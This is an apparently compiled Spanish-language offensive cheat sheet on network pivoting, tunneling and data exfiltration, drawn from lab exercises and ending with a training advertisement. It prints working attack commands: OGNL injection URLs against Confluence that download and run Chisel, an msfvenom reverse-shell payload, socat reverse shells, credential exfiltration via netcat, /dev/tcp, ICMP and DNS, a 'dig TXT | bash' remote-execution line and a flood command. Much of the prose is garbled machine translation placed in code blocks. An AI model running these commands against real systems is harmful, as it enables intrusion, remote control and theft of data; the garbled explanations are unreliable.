Queremos conectarnos al servidor que se ejecuta en nuestra máquina Kali (192.168.118.4:8080), creando un túnel SOCKS inverso (R:socks). El R el prefijo especifica un túnel inverso usando un calcetines proxy (que está vinculado al puerto 1080 por defecto). El redirecciones restantes del shell (> /dev/null 2>&1 &) forzar el proceso para ejecutar en segundo plano, para que nuestra inyección no cuelgue esperando a que termine el proceso.
```

#### Command execution
```bash
Para leer la salida del comando, podemos construir un comando que redirige la salida stdout y stderr a un archivo y luego envía el el contenido de ese archivo a través de HTTP vuelve a nuestra máquina Kali. Usamos el &> operador, que dirige todas las corrientes a stdout, y escribirlo a /tmp/salida. Entonces corremos rizo con el --datos bandera, diciéndole que lea el archivo en /tmp/saliday VOLVER a PUBLICarlo nuestra máquina Kali en el puerto 8080.
```

#### Command execution
```bash
Obtenemos la salida que se ejecuta /tmp/chisel produce. Chisel está tratando de utilizar las versiones 2.32 y 2.34 de glibc, que el El servidor CONFLUENCE01 no tiene.
```

#### Command execution
```bash
similar
```

#### Command execution
```bash
mensajes
```

#### Command execution
```bash
Primero podemos descargar el binario gzipped de Github usando wget. Podemos desempacar eso usando gunzip', luego copiarlo a la /var/www/html/ carpeta para que podamos servirla usando Apache.
```

#### Command execution
```bash
Esto sobrescribirá la copia de Chisel que ya habíamos copiado en el Directorio raíz web apache. Entonces podemos ejecutar el mismo Wget inyección como hicimos antes, para forzar el servidor CONFLUENCE01 a descargue el binario de Chisel y escríbalo a /tmp/chisel.
```

#### Command execution
```bash
SSH no ofrece una opción genérica de línea de comandos proxy SOCKS. En cambio, ofrece el ProxyComando configuración opción. Podemos escribir esto en un archivo de configuración o pasarlo como parte de la línea de comandos con -o.
```

#### Command execution
```bash
ProxyComando acepta un comando shell que se utiliza para abrir un canal habilitado para proxy. La documentación sugiere usar el OpenBSD versión de Netcat, lo que expone el -X marque y puede conectarse a un SOCKS o proxy HTTP. Sin embargo, la versión de Netcat que se entrega con Kali no es compatible proxy.
```

#### Command execution
```bash
Algunos de los laboratorios requieren que lo hagas inicie el machine(s) de destino o descargue el file(s) abajo.
```

#### Command execution
```bash
| cincel_ejercicio_cliente |  |
```

#### Command execution
```bash
| cincel_ejercicio_cliente_aarch64 |  |
```

#### Command execution
```bash
1. Inicie VM Group 1. Siga los pasos de esta sección y configure Chisel como proxy de CALCETINES inversos. SSH en PGDATABASE01 y recuperar la bandera de /tmp/chisel_flag.
```

#### Command execution
```bash
R: OS{da25a93b1b960879d554809ba64edca5}
```

#### Command execution
```bash
Inicie VM Group 2. Descargar el cincel_ejercicio_clienteRecursosaarch64cincel_ejercicio_cliente_aarch64
```

#### Command execution
```bash
binario de la
```

#### Command execution
```bash
R: OS{014e3b9c1a307f7805d65d2a87d33a1f}
```

#### Command execution
```bash
Esta configuración ignora el /etc/resolv.conf y /etc/anfitriones archivos y solo define el zona-auth y auth-servidor variables. Estos le dicen a Dnsmasq que actúe como el servidor de nombres autorizado para el felino.corp zona. Hasta ahora no hemos configurado ningún registro. Las solicitudes de cualquier cosa en el dominio feline.corp devolverán el fallo respuestas.
```

#### Command execution
```bash
En otro caparazón de FELINEAUTHORITY, configuraremos tcpdump para escuchar en el ens192 interfaz para paquetes DNS en UDP/53, utilizando el filtro de captura udp puerto 53.
```

#### Command execution
```bash
nslookup utilizó el servidor DNS que se ejecuta en la interfaz localhost de 127.0.0.53. Esto es normal, ya que es el resolutor de DNS proporcionado por el systemd-resuelto servicio que se ejecuta en Ubuntu. Reenviará la consulta al servidor DNS eso está configurado por Netplan. Sin embargo, puede almacenar en caché los resultados. Si recibimos respuestas DNS obsoletas, deberíamos intentar enjuagar lo local caché DNS con resolvectl cachés. También podemos consultar el Servidor DNS directamente anexando la dirección de servicio a la nslookup comando. Por ejemplo: nslookup exfiltrado-data.feline.corp 192.168.50.64.
```

#### Command execution
```bash
c. Luego comprobaremos el contenido de dnsmasq_txt.conf y correr dnsmasq de nuevo con este nuevo configuración.
```

#### Command execution
```bash
El dnsmasq_txt.conf contiene dos líneas adicionales que comienzan con "txt-record=". Cada una de estas líneas representa a TXT registra que Dnsmasq servirá. Cada uno contiene el dominio el registro TXT es para, a continuación, un cadena arbitraria atributo, separado por una coma. A partir de estas dos definiciones, cualquier registro TXT solicita para www.feline.corp debería devolver las cuerdas "aquí hay algo útil!" y "hay algo menos útil."
```

#### Command execution
```bash
Probemos esta hipótesis. De vuelta en PGDATABASE01, haremos un solicitud de registros TXT para www.feline.corp con nslookup por pasando el -type=txt argumento.
```

#### Command execution
```bash
¡Éxito! Recibimos el atributos de cadena arbitrarios eso fueron definido en dnsconfig_txt.conf.
```

#### Command execution
```bash
Tunneling Through Deep Packet Inspection - DNS Tunneling Fundamentals - Grupo VM
```

#### Command execution
```bash
R: OS{fb27187b4c5e5cb980e48ebb5a11360b}
```

#### Command execution
```bash
Esto indica que el servidor dnscat2 está escuchando en todas las interfaces en UDP/53.
```

#### Command execution
```bash
Cuando se ejecuta sin un pre-compartido --secreto bandera en cada extremo, dnscat2 imprimirá un cadena de autenticación. Esto está acostumbrado a verifique la integridad de la conexión después de que el cifrado haya sido negociado. El cadena de autenticación en este caso ("Annoy Mona Spiced Outran Stump Visas") es el mismo tanto en el cliente como en el servidor, por lo que sabemos que no hay manipulación en línea. Cada vez que se realiza una conexión, la autenticación la cadena cambiará.
```

#### Command execution
```bash
Ahora comenzaremos a interactuar con nuestra sesión desde el servidor dnscat2. Vamos a enumerar todas las ventanas activas con el ventanas comando, entonces correr ventana -i desde nuestro nuevo shell de "comando" para enumerar el disponible comandos.
```

#### Command execution
```bash
Esto devuelve un mensaje con un prefijo "comando". Este es el dnscat2 sesión de comandosy admite bastantes opciones. Podemos aprender más sobre cada comando ejecutándolo con el --ayuda bandera.
```

#### Command execution
```bash
z. De vuelta en el sesión de comandos, corramos escucha --ayuda.
```

#### Command execution
```bash
Chisel utiliza un modelo cliente/servidor. A Servidor de cincel debe ser establecido arriba, que puede aceptar una conexión de la Cliente de cincel. Varios las opciones de reenvío de puertos están disponibles dependiendo del servidor y configuraciones de cliente. Una opción que es particularmente útil para nosotros es reenvío de puertos inversos, que es como el puerto remoto SSH reenvío.
```

#### Command execution
```bash
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

#### Command execution
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
```

#### Command execution
```bash
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

#### Command execution
```bash
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

#### Command execution
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

#### Command execution
```bash
curl http://192.168.238.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.167:8000/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

#### Command execution
```bash
curl http://192.168.238.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.167:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

#### Command execution
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' kali@192.168.238.7
```

#### Command execution
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.238.215
```

#### Command execution
```bash
ssh root@172.24.0.1
```

#### Crear payload MSI: Genera un payload para explotación o callback.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4445 -f msi > myinstaller.msi
```

#### Escaneo TCP a través de proxychains. -sT es obligatorio (SOCKS no soporta raw sockets). -Pn porque ICMP no pasa por SOCKS.
```bash
proxychains -q nmap -sT -Pn -p 22,80,443,445,3389 192.168.1.10
```

#### Enumera SMB en la red interna a través del proxy SOCKS.
```bash
proxychains -q crackmapexec smb 192.168.1.0/24 -u user -p pass
```

#### Shell WinRM a un host interno a través de proxychains.
```bash
proxychains -q evil-winrm -i 192.168.1.10 -u admin -p password
```

#### Escaneo TCP a traves del tunel.
```bash
proxychains -q nmap -sT -Pn 192.168.10.20 -p 22,80,445,3389
```

#### Conecta a WinRM a traves del SOCKS.
```bash
proxychains -q evil-winrm -i 192.168.10.15 -u user -p pass
```

#### Exfiltra un directorio comprimido por Netcat cuando ya existe un canal viable.
```bash
tar czf - loot/ | nc ATTACKER_IP 9001
```

#### Recibe un archivo a traves de un forward o de una conexion TCP simple.
```bash
socat TCP-LISTEN:9001,fork FILE:loot.zip,creat
```

#### Agrega un proxy SOCKS5 a la configuracion de proxychains. Se puede encadenar multiples proxies para pasar por varias capas de tunelamiento.
```bash
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
```

#### Escaneo de puertos a traves de proxychains. -q modo silencioso. Solo TCP connect (-sT) funciona con proxychains. -Pn no hace ping ya que ICMP no pasa por SOCKS.
```bash
proxychains -q nmap -sT -Pn -p 22,80,443,445,3389 <IP_INTERNA>
```

#### Enumeracion SMB de una red interna a traves del tunel SOCKS. CrackMapExec funciona correctamente con proxychains para enumerar shares remotos.
```bash
proxychains -q crackmapexec smb 172.16.0.0/24 -u user -p pass --shares
```

#### Conecta Evil-WinRM a un host en la red interna a traves del proxy SOCKS. Permite obtener un shell PowerShell en maquinas no accesibles directamente.
```bash
proxychains -q evil-winrm -i <IP_INTERNA> -u admin -p password
```

#### Envía un flujo de datos de cero para sobrecargar la capacidad de procesamiento del servidor de registro
```bash
dd if=/dev/zero of=/dev/tcp/<IP>/80 bs=1024 count=100000
```

#### TCP
```bash
Exfiltracion: TCP
```

#### SSH
```bash
SSH
```

#### ICMP
```bash
ICMP
```

#### DNS tunneling
```bash
DNS tunneling
```

#### iodine
```bash
iodine
```

#### Command execution
```bash
nc -lvp 8080 > /tmp/task4-creds.data
```

#### Command execution
```bash
ssh thm@victim1.thm.com
```

#### Command execution
```bash
ssh thm@10.10.113.74 -p 2022
```

#### Command execution
```bash
~$ cat task4/creds.txt
```

#### Command execution
```bash
Admin:123456
```

#### Command execution
```bash
root:toor
```

#### Command execution
```bash
$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

#### Command execution
```bash
ls -l /tmp/
```

#### Command execution
```bash
-rw-r--r-- 1 root root 240 Apr 8 11:37 task4-creds.data
```

#### Command execution
```bash
cd /tmp/
```

#### Command execution
```bash
/tmp/$ dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
```

#### Command execution
```bash
tar xvf task4-creds.tar
```

#### Command execution
```bash
task4/
```

#### Command execution
```bash
task4/creds.txt
```

#### Command execution
```bash
cat task4/creds.txt
```

#### Command execution
```bash
~$ cat task5/creds.txt
```

#### Command execution
```bash
$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

#### Command execution
```bash
cd /tmp/task5/
```

#### Command execution
```bash
/tmp/task5$ cat creds.txt
```

#### Command execution
```bash
ping MACHINE_IP -c 1
```

#### Command execution
```bash
echo "thm:tryhackme" | xxd -p
```

#### Command execution
```bash
ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a
```

#### Command execution
```bash
msf5 > use auxiliary/server/icmp_exfil
```

#### Command execution
```bash
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
```

#### Command execution
```bash
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
```

#### Command execution
```bash
msf5 auxiliary(server/icmp_exfil) > run
```

#### Command execution
```bash
~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
```

#### Command execution
```bash
~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
```

#### Command execution
```bash
~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
```

#### Command execution
```bash
~$ sudo icmpdoor -i eth0 -d 192.168.0.133
```

#### Command execution
```bash
sudo icmp-cnc -i eth1 -d 192.168.0.121
```

#### Command execution
```bash
shell: hostname
```

#### Command execution
```bash
shell: icmp-host
```

#### Command execution
```bash
sudo tcpdump -i eth0 icmp
```

#### Command execution
```bash
~# nano /etc/netplan/aws-vmimport-netplan.yaml
```

#### Command execution
```bash
network:
```

#### Command execution
```bash
ethernets:
```

#### Command execution
```bash
dhcp4: true
```

#### Command execution
```bash
optional: false
```

#### Command execution
```bash
nameservers:
```

#### Command execution
```bash
search: [tunnel.com]
```

#### Command execution
```bash
addresses: [10.10.166.19]
```

#### Command execution
```bash
version: 2
```

#### Command execution
```bash
~# netplan apply
```

#### Command execution
```bash
~$ dig +short test.thm.com
```

#### Command execution
```bash
~$ ping test.thm.com -c 1
```

#### Command execution
```bash
PING test.thm.com (127.0.0.1) 56(84) bytes of data.
```

#### Command execution
```bash
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 ms
```

#### Command execution
```bash
--- test.thm.com ping statistics ---
```

#### Command execution
```bash
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

#### Command execution
```bash
rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
```

#### Command execution
```bash
sudo tcpdump -i eth0 udp port 53 -v
```

#### Command execution
```bash
cat task9/credit.txt | base64 | tr -d "\\n" | fold -w18 | sed 's/.*/&./' | tr -d "\\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```

#### Command execution
```bash
~$ echo "TmFtZTogVEhNLXVzZX..." | cut -d"." -f1-8 | tr -d "." | base64 -d
```

#### Command execution
```bash
cat /tmp/script.sh | base64
```

#### Command execution
```bash
dig +short -t TXT script.tunnel.com | tr -d "\\"" | base64 -d | bash
```

#### Command execution
```bash
sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
```

#### Command execution
```bash
sudo iodine -P thmpass att.tunnel.com
```

#### Command execution
```bash
ssh thm@10.1.1.2 -4 -f -N -D 1080
```

#### Command execution
```bash
proxychains curl <http://192.168.0.100/demo.php>
```

#### Command execution
```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

#### 🐚 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444 # On Kali Machine
```

#### 🐚 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 # On Victim Machine
```

#### 🐚 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
```bash
sudo sh -c 'echo "socks4 127.0.0.1 80" >> /etc/proxychains.conf'
```

#### 🐚 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
```bash
ssh -L 6070:127.0.0.1:2049 megan@10.1.1.27 -N
```

#### 🐚 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
```bash
ssh -L 1433:10.10.126.148:1433 Administrator@192.168.236.147 -N
```

#### 🐚 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
```bash
sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890 administrator@192.168.236.147 -N
```

#### 🛠️ #### Chisel (Port Forwarding Tool)
```bash
mv chisel_1.8.1_windows_386 chisel.exe
```

#### 🛠️ #### Chisel (Port Forwarding Tool)
```bash
certutil -urlcache -split -f http://<your $IP>/chisel.exe chisel.exe # On victim
```

#### 🛠️ #### Chisel (Port Forwarding Tool)
```bash
.\chisel.exe client <kali_IP>:8000 R:socks
```

#### 🐧 Linux PrivEsc (Continuación)
```bash
ssh -i id_ecdsa anita@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
```

#### Command execution
```bash
sudo ip tuntap add user kali mode tun ligolo
```

#### Command execution
```bash
sudo ip route add 20.20.20.0/24 dev ligolo
```

#### Command execution
```bash
ssh -L 8080:127.0.0.1:80 user@10.10.10.10 # Local forward
```

#### Command execution
```bash
ssh -R 8080:127.0.0.1:80 user@10.10.10.10 # Remote forward
```

#### Command execution
```bash
ssh -D 1080 user@10.10.10.10 # Dynamic (SOCKS proxy)
```

#### Command execution
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

#### Command execution
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

#### Command execution
```bash
ligolo-ng >> session # seleccionar sesión activa
```

#### Command execution
```bash
ligolo-ng >> start # iniciar túnel
```

#### Command execution
```bash
sudo ip route add 192.168.1.0/24 dev ligolo # red interna del pivot
```

#### Command execution
```bash
sudo ip route add 10.10.10.0/24 dev ligolo # ajustar a la red que necesites
```

#### Command execution
```bash
ligolo-ng >> listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080
```

#### Command execution
```bash
./chisel server -p 8000 --reverse
```

#### Command execution
```bash
./chisel server -p 8000 --reverse --socks5
```

#### Command execution
```bash
./chisel client ATTACKER_IP:8000 R:socks
```

#### Command execution
```bash
./chisel client ATTACKER_IP:8000 R:3306:INTERNAL_HOST:3306
```

#### Command execution
```bash
./chisel client ATTACKER_IP:8000 8080:INTERNAL_HOST:80
```

#### Command execution
```bash
ssh -D 1080 user@PIVOT_IP
```

#### Command execution
```bash
ssh -D 1080 -f -N user@PIVOT_IP
```

#### Command execution
```bash
ssh -L 8080:192.168.1.10:80 user@PIVOT_IP
```

#### Command execution
```bash
ssh -L 3306:192.168.1.20:3306 user@PIVOT_IP
```

#### Command execution
```bash
ssh -R 4444:localhost:4444 user@PIVOT_IP
```

#### Command execution
```bash
wsl.exe ssh -D 1080 -f -N user@PIVOT_IP
```

#### Command execution
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid
```

#### Command execution
```bash
socat - TCP:TARGET_IP:4444
```

#### Command execution
```bash
| sudo ip tuntap add user $(whoami) mode tun ligolo | Create tunnel interface | | sudo ip link set ligolo up | Bring up tunnel interface | | sudo ip route add 10.10.0.0/24 dev ligolo | Add route through tunnel | # Socat | Command | Description | | socat TCP-LISTEN:8080,fork TCP:TARGET:80 | Simple port forward | | socat TCP-LISTEN:8080,fork,reuseaddr OPENSSL:TARGET:443,verify=0 | Encrypted relay to target | | socat OPENSSL-LISTEN:443,cert=cert.pem,fork TCP:127.0.0.1:80 | Encrypted listener forwarding to local port | # Plink (Windows) | Command | Description | | plink.exe -ssh -L 8080:TARGET:80 user@ATTACKER | Local port forward from Windows | | plink.exe -ssh -R 8080:localhost:80 user@ATTACKER | Remote port forward from Windows | | plink.exe -ssh -D 9050 user@ATTACKER | Dynamic SOCKS proxy from Windows | # SSHuttle | Command | Description | | sshuttle -r user@pivot 10.10.0.0/24 | Transparent proxy through pivot for subnet | | sshuttle -r user@pivot 10.10.0.0/24 172.16.0.0/16 | Proxy multiple subnets | | sshuttle -r user@pivot 0.0.0.0/0 | Route all traffic through pivot | # Netsh (Windows) | Command | Description | | netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=TARGET | Add port forward rule | | netsh interface portproxy show all | Show all port proxy rules | | netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0 | Delete port forward rule | | netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=8080 | Allow port through firewall | # DPI Tunneling | Command | Description | | chisel server -p 443 --reverse --socks5 | HTTP tunneling: Chisel over port 443 | | chisel client ATTACKER:443 R:socks | HTTP tunneling: client connect | | dnscat2-server domain.com | DNS tunneling: start dnscat2 server | | ./dnscat domain.com | DNS tunneling: start dnscat2 client | # Ngrok & Cloudflared | Command | Description | | ngrok http 80 | Expose local port 80 via ngrok | | ngrok tcp 4444 | Expose TCP port via ngrok | | cloudflared tunnel --url http://localhost:8080 | Quick tunnel via Cloudflare | | cloudflared tunnel create mytunnel | Create named Cloudflare tunnel | # ICMP Tunneling & Others | Command | Description | | ptunnel-ng -r ATTACKER -R 22 | ICMP tunnel server (forward SSH) | | ptunnel-ng -p PIVOT -l 8080 -r TARGET -R 80 | ICMP tunnel client | | python neoreg.py generate -k password | Neo-reGeorg: generate webshell tunnel | | python neoreg.py -k password -u http://TARGET/tunnel.php | Neo-reGeorg: connect to webshell tunnel |
```

#### Monitoriza tráfico HTTP entrante para depurar el funcionamiento del túnel Chisel.
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

#### Captura tráfico DNS desde y hacia el servidor autoritativo FELINEAUTHORITY.
```bash
sudo tcpdump -i ens192 udp port 53
```

#### Descomprime y sirve una versión alternativa de Chisel compatible con sistemas más antiguos.
```bash
gunzip chisel_1.8.1_linux_amd64.gz && sudo cp ./chisel /var/www/html
```

#### Verifica configuración actual de DNS en sistemas Linux modernos con systemd.
```bash
resolvectl status
```

---

## 🎓 Advanced Hands-On Training

Want to master network pivoting across multi-forest Active Directory architectures, segmented corporate DMZs, and restricted EDR environments?

* 🛡️ **Interactive Labs & Training Paths:** [academy.araizcorp.tech](https://academy.araizcorp.tech)
* 💼 **Enterprise Security Consulting & Research:** [araizcorp.tech](https://araizcorp.tech)
* ✉️ **Direct Inquiries:** info@araizcorp.tech

<p align="center"><sub>© 2026 AraizCorp LLC. All rights reserved. Offensive Security & Red Team Research.</sub></p>
